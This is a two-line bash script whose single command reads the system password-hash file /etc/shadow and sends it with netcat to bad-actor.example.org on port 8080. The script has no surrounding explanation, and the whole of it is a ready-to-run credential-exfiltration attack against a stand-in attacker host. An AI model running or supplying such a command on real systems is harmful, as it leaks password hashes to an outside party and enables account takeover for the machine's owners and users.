#!/bin/bash
cat /etc/shadow | nc bad-actor.example.org 8080
